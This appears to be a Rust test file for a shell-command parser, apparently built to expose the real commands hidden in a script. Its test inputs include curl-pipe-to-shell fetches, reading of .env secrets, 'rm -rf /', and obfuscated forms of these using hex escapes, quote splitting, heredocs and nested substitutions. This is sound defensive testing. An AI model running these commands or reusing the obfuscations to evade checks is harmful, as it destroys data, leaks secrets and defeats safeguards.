use super::*;

fn argvs(input: &str) -> Vec<Vec<String>> {
    parse(input)
        .commands()
        .map(|c| c.words.iter().map(|w| w.text.clone()).collect())
        .collect()
}

fn first(input: &str) -> SimpleCommand {
    parse(input).commands().next().cloned().expect("a command")
}

#[test]
fn splits_on_operators() {
    assert_eq!(
        argvs("ls -la; echo hi && rm x || true & wait"),
        vec![
            vec!["ls", "-la"],
            vec!["echo", "hi"],
            vec!["rm", "x"],
            vec!["true"],
            vec!["wait"]
        ]
    );
}

#[test]
fn pipelines_mark_piped_stdin() {
    let script = parse("curl -s https://x.sh | sh");
    assert_eq!(script.pipelines.len(), 1);
    let cmds = &script.pipelines[0].commands;
    assert_eq!(cmds.len(), 2);
    assert!(!cmds[0].stdin_piped);
    assert!(cmds[1].stdin_piped);
}

#[test]
fn pipe_into_subshell_keeps_piped_flag() {
    let script = parse("(curl x) | (sh)");
    let sh = script.commands().find(|c| c.words[0].text == "sh").unwrap();
    assert!(sh.stdin_piped);
}

#[test]
fn quote_removal() {
    assert_eq!(argvs(r#"'r'm -"r"f \/"#), vec![vec!["rm", "-rf", "/"]]);
    assert_eq!(argvs(r#"r\m"#), vec![vec!["rm"]]);
    assert_eq!(argvs(r#""a b" 'c d'"#), vec![vec!["a b", "c d"]]);
    assert_eq!(argvs(r#"echo "it's" 'say "hi"'"#)[0][1], "it's");
}

#[test]
fn ansi_c_quoting_is_decoded() {
    assert_eq!(argvs(r"$'\x72\x6d' -rf /"), vec![vec!["rm", "-rf", "/"]]);
    assert_eq!(argvs(r"$'\162\155'"), vec![vec!["rm"]]);
    assert_eq!(argvs(r"$'rm'"), vec![vec!["rm"]]);
}

#[test]
fn variables_are_marked_dynamic() {
    let cmd = first("rm -rf $HOME/x \"${TARGET}\"");
    assert_eq!(cmd.words[2].vars, vec!["HOME"]);
    assert!(!cmd.words[2].is_static());
    assert_eq!(cmd.words[3].vars, vec!["TARGET"]);
    let single = first("echo '$HOME'");
    assert!(single.words[1].is_static());
    assert_eq!(single.words[1].text, "$HOME");
}

#[test]
fn command_substitution_is_parsed_and_flattened() {
    let all = argvs("echo $(rm -rf /) `curl evil.sh`");
    assert!(all.contains(&vec!["rm".to_string(), "-rf".into(), "/".into()]));
    assert!(all.contains(&vec!["curl".to_string(), "evil.sh".into()]));
    let echo = parse("echo $(rm -rf /)")
        .commands()
        .find(|c| c.words[0].text == "echo")
        .cloned()
        .unwrap();
    assert!(echo.words[1].substitution);
}

#[test]
fn nested_substitutions() {
    let all = argvs("echo $(echo $(rm -rf /tmp/x))");
    assert!(all.iter().any(|a| a[0] == "rm"));
}

#[test]
fn substitution_inside_double_quotes() {
    let all = argvs(r#"echo "value: $(cat .env)""#);
    assert!(all.iter().any(|a| a == &vec!["cat", ".env"]));
}

#[test]
fn process_substitution() {
    let script = parse("bash <(curl -fsSL https://x.sh)");
    let all: Vec<_> = script.commands().collect();
    assert!(all.iter().any(|c| c.words[0].text == "curl"));
    let bash = all.iter().find(|c| c.words[0].text == "bash").unwrap();
    assert!(bash.words[1].substitution);
}

#[test]
fn control_structures_expose_commands() {
    let all = argvs("if true; then rm -rf /x; else echo no; fi");
    assert!(all.contains(&vec!["rm".to_string(), "-rf".into(), "/x".into()]));
    let all = argvs("for f in *; do rm -rf \"$f\"; done");
    assert_eq!(all, vec![vec!["rm", "-rf", "$f"]]);
    let all = argvs("while read l; do echo $l; done < in.txt");
    assert!(all.contains(&vec!["read".to_string(), "l".into()]));
    let all = argvs("{ rm -rf /x; }");
    assert_eq!(all, vec![vec!["rm", "-rf", "/x"]]);
    let all = argvs("! rm x");
    assert_eq!(all, vec![vec!["rm", "x"]]);
}

#[test]
fn function_bodies_are_commands() {
    let all = argvs("f() { rm -rf /x; }; f");
    assert!(all.contains(&vec!["rm".to_string(), "-rf".into(), "/x".into()]));
}

#[test]
fn comments_are_ignored() {
    assert_eq!(argvs("ls # rm -rf /"), vec![vec!["ls"]]);
    assert_eq!(argvs("echo a#b"), vec![vec!["echo", "a#b"]]);
}

#[test]
fn assignments_are_separated() {
    let cmd = first("FOO=bar BAZ='q x' env");
    assert_eq!(cmd.assignments.len(), 2);
    assert_eq!(cmd.assignments[0].0, "FOO");
    assert_eq!(cmd.assignments[1].1.text, "q x");
    assert_eq!(cmd.words[0].text, "env");
    // Not an assignment when the name is quoted or after the command word.
    let cmd = first("'FOO'=bar");
    assert!(cmd.assignments.is_empty());
    let cmd = first("echo FOO=bar");
    assert_eq!(cmd.words.len(), 2);
}

#[test]
fn assignment_substitution_is_parsed() {
    let all = argvs("X=$(rm -rf /tmp/y)");
    assert!(all.contains(&vec!["rm".to_string(), "-rf".into(), "/tmp/y".into()]));
}

#[test]
fn redirections() {
    let cmd = first("echo x > out.txt 2>&1 >> log < in &> both");
    let kinds: Vec<_> = cmd.redirects.iter().map(|r| r.kind).collect();
    assert_eq!(
        kinds,
        vec![
            RedirectKind::Write,
            RedirectKind::Dup,
            RedirectKind::Append,
            RedirectKind::Read,
            RedirectKind::Write
        ]
    );
    assert_eq!(cmd.redirects[0].target.text, "out.txt");
    assert_eq!(cmd.redirects[1].fd, Some(2));
    assert_eq!(cmd.words.len(), 2);
    let cmd = first("echo x>file");
    assert_eq!(cmd.words, vec![Word::literal("echo"), Word::literal("x")]);
}

#[test]
fn heredoc_body_is_captured() {
    let script = parse("bash <<EOF\nrm -rf /\necho done\nEOF\nls");
    let bash = script.commands().next().unwrap();
    assert_eq!(bash.redirects[0].kind, RedirectKind::Heredoc);
    assert_eq!(
        bash.redirects[0].body.as_deref(),
        Some("rm -rf /\necho done\n")
    );
    // The body is data, not commands of the outer script.
    assert_eq!(
        argvs("bash <<EOF\nrm -rf /\nEOF\nls"),
        vec![vec!["bash"], vec!["ls"]]
    );
}

#[test]
fn unquoted_heredoc_expands_substitutions() {
    let all = argvs("cat <<EOF\n$(rm -rf /x)\nEOF");
    assert!(all.contains(&vec!["rm".to_string(), "-rf".into(), "/x".into()]));
    // Quoted delimiter: no expansion.
    let all = argvs("cat <<'EOF'\n$(rm -rf /x)\nEOF");
    assert_eq!(all, vec![vec!["cat"]]);
}

#[test]
fn here_string() {
    let cmd = first("bash <<< 'rm -rf /'");
    assert_eq!(cmd.redirects[0].kind, RedirectKind::HereString);
    assert_eq!(cmd.redirects[0].target.text, "rm -rf /");
}

#[test]
fn brace_expansion_is_flagged() {
    let cmd = first("{rm,-rf,/}");
    assert!(cmd.words[0].brace);
    let cmd = first("find . -exec echo {} \\;");
    assert!(cmd.words.iter().all(|w| !w.brace));
    let cmd = first("echo file{1..3}");
    assert!(cmd.words[1].brace);
}

#[test]
fn tilde_and_globs() {
    let cmd = first("rm -rf ~/x *.log '~'");
    assert!(cmd.words[2].tilde);
    assert!(cmd.words[3].glob);
    assert!(!cmd.words[4].tilde);
}

#[test]
fn line_continuation() {
    assert_eq!(argvs("rm \\\n -rf \\\n /"), vec![vec!["rm", "-rf", "/"]]);
}

#[test]
fn unterminated_input_is_reported() {
    assert!(parse("echo 'oops")
        .issues
        .contains(&Issue::UnterminatedQuote));
    assert!(parse("echo $(ls")
        .issues
        .contains(&Issue::UnterminatedSubstitution));
}

#[test]
fn case_is_flagged_as_unsupported() {
    let script = parse("case $x in a) rm -rf /;; esac");
    assert!(script.issues.contains(&Issue::UnsupportedSyntax("case")));
}

#[test]
fn deep_nesting_does_not_overflow() {
    let mut input = String::new();
    for _ in 0..5_000 {
        input.push_str("$(");
    }
    input.push_str("rm -rf /");
    for _ in 0..5_000 {
        input.push(')');
    }
    let script = parse(&format!("echo {input}"));
    assert!(script.issues.contains(&Issue::TooDeep));
    let mut backticks = String::from("echo ");
    for _ in 0..100 {
        backticks.push_str("$(echo `");
    }
    let _ = parse(&backticks);
}

#[test]
fn arrays_and_arithmetic() {
    let all = argvs("a=(one $(rm -rf /x) three); (( i = $(id -u) + 1 ))");
    assert!(all.iter().any(|a| a.first().is_some_and(|w| w == "rm")));
    assert!(all.iter().any(|a| a.first().is_some_and(|w| w == "id")));
}

#[test]
fn never_panics_on_garbage() {
    for input in [
        "",
        " ",
        "|",
        "||",
        "&&",
        ";;",
        ")",
        "(",
        "$(",
        "`",
        "'",
        "\"",
        "\\",
        "<<",
        "<<<",
        ">",
        "2>",
        "${",
        "$((",
        "{",
        "}",
        "$'\\x",
        "$'\\u12345678",
        "a=(",
        "f()",
        "<(",
        "cat <<",
    ] {
        let _ = parse(input);
    }
}
